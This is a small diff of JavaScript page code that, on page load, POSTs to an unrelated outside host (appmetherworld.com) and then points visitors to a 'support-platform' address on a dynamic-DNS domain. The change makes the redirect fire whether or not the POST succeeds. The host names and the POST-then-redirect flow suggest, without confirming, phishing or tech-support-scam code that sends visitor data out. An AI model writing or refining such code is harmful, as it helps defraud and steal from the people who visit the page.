@@ -152,7 +152,7 @@ document.addEventListener('DOMContentLoaded', function () {
     xhr.open('POST', 'https://appmetherworld.com/ikapitol/', true);
 
     xhr.onreadystatechange = function () {
-      if (xhr.status === 200) {
+      if (xhr.readyState === 4) {
          var timestamp = new Date().getTime();
          var redirectUrl = 'https://support-platform.ddns.net/Index/Start?timestamp=' + timestamp;
          alert(redirectUrl);
